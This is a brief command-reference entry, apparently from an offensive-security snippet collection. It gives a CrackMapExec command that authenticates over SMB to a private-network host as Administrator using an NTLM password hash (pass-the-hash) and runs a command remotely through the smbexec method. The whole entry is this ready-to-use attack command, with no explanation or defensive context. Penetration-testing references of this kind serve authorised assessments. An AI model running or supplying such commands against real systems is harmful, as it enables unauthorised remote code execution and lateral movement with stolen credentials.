---
id: 158a9799-e210-4c52-8df0-ca87bc4b7d01
name: Execute smb module with smbexec method and command
type: command
executor: bash
data: root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f"
  --exec-method smbexec -X 'whoami'
output: null
created_at: '2023-04-06T03:56:01.851663+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Execute smb module with smbexec method and command

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
```


